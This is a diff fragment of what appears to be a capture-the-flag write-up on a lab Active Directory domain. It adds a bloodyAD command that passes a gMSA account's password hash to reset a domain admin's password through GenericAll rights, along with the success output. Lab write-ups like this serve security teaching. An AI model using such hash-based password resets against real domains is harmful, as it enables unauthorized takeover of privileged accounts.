@@ -486,5 +486,8 @@ I have GenericAll over the user `tristan.davies`, and that user is a domain admi
 # Domain admin abusing `GenericAll`
 
 ```python
+bloodyAD --host research.search.htb -d search.htb -u 'BIR-ADFS-GMSA$' -p ':e1e9fd9e46d0d747e1595167eedcec0f' set password 'tristan.davies' 'Password123!'
 
+[+] Password changed successfully!
 ```
+Ill change the users password using Bloody
